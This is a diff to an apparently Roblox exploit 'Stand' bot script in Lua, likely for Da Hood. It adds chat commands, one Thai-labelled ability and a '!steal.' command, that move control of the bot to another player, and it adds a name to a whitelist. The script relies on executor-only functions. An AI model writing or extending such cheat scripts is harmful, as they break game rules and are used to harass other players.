@@ -5200,6 +5200,19 @@ function Stand(targetName)
             end
         end)
         
+        Oldowner = game.Players[getgenv().Owner]
+        CreateTargetAbility("ให้!",function()
+            if TARGET then
+                OlDOWNER = getgenv().Owner
+                OWNER = TARGET
+                Chat("คนคุมคนใหม่ "..TARGET.Name)
+                Oldowner.Chatted:Connect(function(message)
+                    if message:lower() == "กลับมา!" then
+                        OWNER = Oldowner
+                    end
+                end)       
+            end
+        end)
         
         CreateTargetAbility("cart!",function()
             if TARGET then
@@ -7322,7 +7335,7 @@ function Stand(targetName)
             Event:FireServer(A_1, A_2)
         end
         
-        local targetNames = {"isthisdo23", "cruciatusadidas", "roopin01", "deeralttrue","dahoodbotmoney5","yowhatsubbro","Rag0_IQ"}
+        local targetNames = {"isthisdo23", "cruciatusadidas","RKLWPGZLG", "roopin01", "deeralttrue","dahoodbotmoney5","yowhatsubbro","Rag0_IQ"}
         if table.find(targetNames, game.Players.LocalPlayer.Name) then
             print("DEER")
         else
@@ -7354,6 +7367,11 @@ function Stand(targetName)
                     Annoy = false
                     Stop()
                     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
+                elseif msg:lower() == "!steal." then
+                    Oldowner = game.Players[getgenv().Owner]
+                            OlDOWNER = getgenv().Owner
+                            OWNER = targetPlayer
+                            Chat("New owner "..targetPlayer.Name)
                 elseif msg:lower() == "!log." then
                     game:Shutdown()
                 elseif msg:lower() == "!Buy." then
